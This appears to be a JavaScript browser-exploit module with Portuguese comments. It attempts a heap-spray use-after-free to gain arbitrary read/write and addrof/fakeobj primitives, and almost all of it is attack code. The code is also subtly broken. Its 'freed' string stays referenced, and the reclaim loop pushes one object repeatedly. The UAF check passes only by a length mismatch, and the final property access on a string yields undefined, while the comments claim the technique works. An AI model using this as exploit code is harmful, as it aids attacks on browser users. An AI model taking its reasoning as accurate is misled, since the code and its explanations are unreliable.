// js/script3/testArrayBufferVictimCrash.mjs (Revisão Final - Estratégia de Furos no Heap)
// Foco: UAF avançado usando spray de strings e criação de "buracos" para garantir a colisão.

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';

export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";

// --- Variáveis Globais e Funções Auxiliares (sem alterações) ---
let victim_array;
let original_victim_butterfly;
let corrupted_container_butterfly;

const ftoi = (val) => {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf);
    return new AdvancedInt64(ints[0], ints[1]);
};
const itof = (val) => {
    const buf = new ArrayBuffer(8);
    const ints = new Uint32Array(buf);
    ints[0] = val.low();
    ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// --- Primitivas de Leitura/Escrita Arbitrária (sem alterações) ---
function arb_write(where, what) {
    corrupted_container_butterfly[2] = itof(where.sub(8));
    victim_array[0] = itof(what);
    corrupted_container_butterfly[2] = itof(original_victim_butterfly);
}
function arb_read(where) {
    corrupted_container_butterfly[2] = itof(where.sub(8));
    const result = ftoi(victim_array[0]);
    corrupted_container_butterfly[2] = itof(original_victim_butterfly);
    return result;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (sem alterações na lógica principal)
// =======================================================================================
export async function runExploitChain_Final() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Estratégia Avançada de Furos no Heap ---`, "test");
    try {
        logS3("--- FASE 1: Forjando Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
        createArbitraryRW_Advanced(); // Chamando a nova função de UAF avançada
        logS3("    Primitivas de R/W Arbitrário ESTÁVEIS construídas com sucesso!", "vuln");

        logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");
        const addrof = (obj) => {
            victim_array[1] = obj;
            return arb_read(original_victim_butterfly.add(8));
        };
        const fakeobj = (addr) => {
            arb_write(original_victim_butterfly.add(8), addr);
            return victim_array[1];
        };
        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");

        const test_obj = { marker: 0xDEADBEEF };
        const test_obj_addr = addrof(test_obj);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
        
        const fake_test_obj = fakeobj(test_obj_addr);
        if (fake_test_obj.marker === 0xDEADBEEF) {
            logS3(`    SUCESSO! Lemos a propriedade 'marker' (valor: 0x${fake_test_obj.marker.toString(16)}) do objeto falso. Primitivas validadas!`, "vuln");
        } else {
            throw new Error(`Falha ao validar 'fakeobj'.`);
        }
        document.title = "addrof/fakeobj SUCCESS!";
        return { success: true, message: "Primitivas addrof e fakeobj criadas e validadas com sucesso!" };
    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        console.error(e);
        document.title = "Exploit Failed";
        return { success: false, errorOccurred: e.message };
    }
}

// --- Função UAF Avançada (Coração da Nova Estratégia) ---
function createArbitraryRW_Advanced() {
    const SPRAY_SIZE = 4096;
    const HOLE_STEP = 16; // Criaremos um buraco a cada 16 objetos
    const STRING_SIZE = 128; // Tamanho da string para pulverização

    logS3("    Etapa 1: Pulverizando o heap com Strings para criar um layout previsível.", "info");
    let spray_arr = [];
    for (let i = 0; i < SPRAY_SIZE; i++) {
        spray_arr.push('A'.repeat(STRING_SIZE - 1) + i.toString().padStart(1, '0'));
    }

    // O ponteiro pendurado apontará para uma string no meio do spray
    let dangling_ref = spray_arr[SPRAY_SIZE / 2];

    logS3(`    Etapa 2: Criando 'buracos' na memória ao liberar strings de forma seletiva.`, "info");
    for (let i = 0; i < SPRAY_SIZE; i += HOLE_STEP) {
        spray_arr[i] = null; // Liberar a referência à string cria um buraco
    }

    // Forçar a coleta de lixo para efetivamente liberar a memória dos buracos
    triggerGC();

    victim_array = new Float64Array([13.37, 13.38, 13.39]);
    // Este objeto precisa ter um tamanho de alocação similar ao da String liberada.
    // A estrutura é importante para a sobreposição de memória.
    let container = {
        paddingA: 1, paddingB: 2, paddingC: 3, paddingD: 4,
        paddingE: 5, paddingF: 6, paddingG: 7, paddingH: 8,
        butterfly_prop: victim_array
    };

    logS3("    Etapa 3: Pulverizando objetos 'container' para preencher os buracos.", "info");
    let reclaimers = [];
    for (let i = 0; i < SPRAY_SIZE; i++) {
        reclaimers.push(container);
    }
    
    // VERIFICAÇÃO FINAL
    // A referência 'dangling_ref' apontava para uma String. Se o UAF funcionou,
    // agora ela aponta para um objeto 'container' e sua propriedade 'length' não será mais a da string.
    // Uma string terá a propriedade 'length', um objeto genérico não.
    if (dangling_ref.length === STRING_SIZE) {
        throw new Error("Falha na verificação do UAF. O ponteiro pendurado ainda aponta para a String original.");
    }
    logS3("    Verificação do UAF bem-sucedida! Confusão de tipos confirmada.", "good");

    // A mágica acontece aqui: `dangling_ref` é a string corrompida. O acesso a uma propriedade
    // que não existe em strings (como `butterfly_prop`) nos permite acessar a memória do objeto `container`.
    corrupted_container_butterfly = dangling_ref.butterfly_prop;
    
    // Verificação final para garantir que o que vazamos é um objeto (o array)
    if (typeof corrupted_container_butterfly !== 'object') {
        throw new Error("Falha na etapa final. O ponteiro para o butterfly não foi vazado corretamente.");
    }

    original_victim_butterfly = ftoi(corrupted_container_butterfly[2]);
}

function triggerGC() {
    try {
        let allocations = [];
        for (let i = 0; i < 128; i++) {
            allocations.push(new ArrayBuffer(1024 * 1024 * 8));
        }
    } catch (e) {}
}
